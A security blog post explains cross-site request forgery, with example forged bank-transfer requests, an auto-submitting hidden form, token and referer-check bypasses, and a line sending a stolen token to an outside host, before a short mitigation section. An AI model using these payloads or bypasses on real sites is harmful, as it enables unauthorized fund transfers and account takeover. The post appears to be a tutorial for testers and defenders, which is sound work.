---
layout: post
title:  "CSRF Attacks - How to Find, Exploit and fix them"
author: snapsec
categories: [ cybersecurity,csrf,web-attacks ]
image: assets/images/csrf-101.png
---



Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application. 

### CSRF flaw and its exploitation

CSRF is an attack that tricks the victim into submitting a malicious request. It inherits the identity and privileges of the victim to perform an undesired function on the victim’s behalf (though note that this is not true of login CSRF, a special form of the attack let me describe it ). For most sites, browser requests automatically include any credentials associated with the site, such as the user’s session cookie, IP address, Windows domain credentials, and so forth. Therefore, if the user is currently authenticated to the site, the site will have no way to distinguish between the forged request sent by the victim and a legitimate request sent by the victim. CSRF attacks target functionality that causes a state change on the server, such as changing the victim’s email address or password, or purchasing something. 


### CSRF Attack Example:

Before executing an assault, a perpetrator typically studies an application in order to make a forged request appear as legitimate as possible. 
For example, a typical GET request for a $100 bank transfer might look like:
```
GET http://netbank.com/transfer.do?acct=PersonB&amount=$100 HTTP/1.1
```
An attacker can modify this script so it results in a $100 transfer to their own account. Now the malicious link look like:
```
GET http://netbank.com/transfer.do?acct=AttackerA&amount=$100 HTTP/1.1
```
A bad actor can embed the request into an innocent looking hyperlink:
```
<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>
```
Next the attacker can distribute the hyperlink via email to a large number of bank customers. Those who click on the link while logged into their bank account will unintentionally initiate the $100 transfer.
 Note that if the bank’s website is only using POST requests, it’s impossible to frame malicious requests using a  href tag. However, the attack could be delivered in a form tag with automatic execution of the embedded JavaScript. 
 his is how such a form may look like:
 ```
  <body onload="document.forms[0].submit()">
   <form action="http://netbank.com/transfer.do" method="POST">
     <input type="hidden" name="acct" value="AttackerA"/>
     <input type="hidden" name="amount" value="$100"/>
     <input type="submit" value="View my pictures!"/>
   </form>
 </body>
 ```

##  Bypasses for CSRF attack:

#### Change the request method

Another thing worth trying is changing the request method of the request. If the sensitive request that you would like to forge is sent via the POST method, try converting the request to a GET request. And if the action is done via a GET, try converting it into a POST. The application might still execute the action and the same protection mechanism is often not in place.
For example, this request:
```
POST /change_password
POST body:
new_password=qwerty
```
Can be rewritten as:
```
GET /change_password?new_password=qwerty
```
#### CSRF Protection via Tokens

Just because a site is using CSRF tokens does not mean that it is validating them properly. Here are a few things that you can try to bypass CSRF protection via tokens.

#### Delete the token param or send a blank token

Not sending a token works fairly often because of this common application logic mistake: applications sometimes only check the validity of the token if the token exists, or if the token parameter is not blank. In this case, sending a request without the token, or a blank value as the token may be all you need to bypass the protection.
For example, if a legitimate request looks like this:

```http
POST /change_password
POST body:
new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
```

Try this:

```http
POST /change_password
POST body:
new_password=qwerty
```

Or, this:

```http
POST /change_password
POST body:
new_password=qwerty &csrf_tok=
```


#### Use another session’s CSRF token

The application might only be checking if the token is _valid_ or not, and not checking if it _belongs to the current user_. If that’s the case, you can simply hard code your own CSRF token into the payload. Let’s say the victim’s token is _871caef0757a4ac9691aceb9aad8b65b_, and yours is YOUR_TOKEN. You can obtain your own CSRF token easily but not the victim’s token. Try to bypass the CSRF protection by providing your own token in the place of the legitimate token.
In other words, instead of sending this:

```http
POST /change_password
POST body:
new_password=qwerty &csrf_tok=871caef0757a4ac9691aceb9aad8b65b
```


Send this:
```
POST /change_password
POST body:
new_password=qwerty &csrf_tok=YOUR_TOKEN
```


## Referer Based CSRF Checks
Let’s say that _attacker.com_ is a domain that you own. And _bank.com_ is the site that you are attacking. The site is not using CSRF tokens but is checking the referer header instead. What can you do now?

- Sending a blank tokens is one of the first things that you should do, sometimes all you need to do to bypass a referer check is to simply not send a referer. To do this, you can add the following meta tag to the page hosting your payload:
```
<meta name=”referrer” content=”no-referrer”>
```
The application might only be validating the referer if one is sent, in that case, you’ve successfully bypassed its CSRF protection!




#### Bypass the regex
If the referer check is based on a whitelist, you can try bypassing the regex used to validate the URL. For example, you can try placing victim domain name in referer URL as a subdomain or as a directory:
If the site is looking for “_bank.com”_ in the referer URL, maybe “_bank.com.attacker.com”_ or “_attacker.com/bank.com”_ will work.


#### Extracting token via HTML injection

This technique utilizes HTML injection vulnerability using which an attacker can plant a logger to extract the CSRF token from that web page and use that token. An attacker can plant a link such as
```
<form action=”http://shahmeeramir.com/acquire_token.php”></textarea>
```
#### Decoding CSRF tokens:

Another method to bypass CSRF is to identify the algorithm of the CSRF token. In my experience CSRF tokens are either MD5 or Base64 encoded values. You can decode that value and encode the next one in that algorithm and use that token. For instance “a0a080f42e6f13b3a2df133f073095dd” is MD5(122). You can similarly encrypt the next value MD5(123) to for CSRF token bypass.


### Mitigation of CSRF attack

A number of effective methods exist for both prevention and mitigation of CSRF attacks. From a user’s perspective, prevention is a matter of safeguarding login credentials and denying unauthorised actors access to applications. The most robust way to defend against CSRF attacks is to include a CSRF token within relevant requests. The token should be:
-   Unpredictable with high entropy, as for session tokens in general.
-   Tied to the user's session.
-   Strictly validated in every case before the relevant action is executed.


## Conclusion:

CSRF is a vulnerability that allows attackers to circumvent the SOP (same origin policy) which leas to various unintended actions on victims account.

There are various bypasses to bypass the csrf protection implemented by the web applications as below:

- Sending only csrf token  header with empty token.

- Use csrf token generated in another session.

- Try submitting same length randomly generated csrf token to check if it validation is only based on token length.
